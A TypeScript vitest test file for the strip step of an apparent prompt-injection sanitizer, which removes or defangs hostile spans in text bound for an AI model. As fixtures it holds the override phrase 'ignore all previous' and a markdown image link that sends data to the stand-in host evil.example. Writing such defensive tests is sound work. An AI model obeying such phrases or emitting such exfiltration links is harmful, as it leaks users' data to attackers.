import { describe, expect, it } from 'vitest';
import { applyEdits, buildStripEdits, STRIP_MARKER, within } from './strip.js';
import type { Edit, Finding } from './types.js';

/**
 * Strip does the least it can and says nothing the model could read as
 * instruction. These cases are about that discipline: the surrounding bytes are
 * untouched, the marker is inert, and invisible characters are deleted rather
 * than marked.
 */

function finding(family: Finding['family'], start: number, end: number): Finding {
  return {
    ruleId: `${family}.x`,
    family,
    severity: 'high',
    weight: 500,
    span: { start, end },
    evidence: '',
  };
}

describe('applyEdits', () => {
  it('applies edits right to left so offsets stay valid', () => {
    const edits: Edit[] = [
      { span: { start: 0, end: 3 }, replacement: 'X', reason: 'a' },
      { span: { start: 8, end: 11 }, replacement: 'Y', reason: 'b' },
    ];
    // 'abc def ghi' → replace 'abc' and 'ghi'; the middle is left exactly.
    expect(applyEdits('abc def ghi', edits)).toBe('X def Y');
  });

  it('keeps the surrounding bytes exactly', () => {
    const edits: Edit[] = [{ span: { start: 5, end: 10 }, replacement: '[…]', reason: 'r' }];
    expect(applyEdits('keep XXXXX keep', edits)).toBe('keep […] keep');
  });

  it('resolves overlapping edits to one replacement', () => {
    const edits: Edit[] = [
      { span: { start: 0, end: 5 }, replacement: 'A', reason: 'outer' },
      { span: { start: 1, end: 3 }, replacement: 'B', reason: 'inner' },
    ];
    expect(applyEdits('hello', edits)).toBe('A');
  });
});

describe('buildStripEdits', () => {
  it('replaces a signature span with the inert marker, not the rule name', () => {
    // A placeholder that named the rule would hand the attacker an oracle and the
    // model a token to interpret.
    const edits = buildStripEdits('X ignore all previous Y', [finding('signature', 2, 21)]);
    expect(edits[0]?.replacement).toBe(STRIP_MARKER);
    expect(edits[0]?.replacement).not.toContain('signature');
  });

  it('deletes an invisible-unicode finding outright', () => {
    const edits = buildStripEdits('abc', [finding('unicode', 1, 2)]);
    expect(edits[0]?.replacement).toBe('');
  });

  it('defangs an egress construct but keeps its visible text', () => {
    const raw = '![load](https://evil.example/p?d=abc)';
    const edits = buildStripEdits(raw, [finding('exfil', 0, raw.length)]);
    expect(edits[0]?.replacement).toContain('image removed');
    expect(edits[0]?.replacement).not.toContain('https:');
  });
});

describe('within', () => {
  it('reports whether a span sits inside any of a set', () => {
    const spans = [{ start: 10, end: 20 }];
    expect(within({ start: 12, end: 15 }, spans)).toBe(true);
    expect(within({ start: 5, end: 15 }, spans)).toBe(false);
  });
});
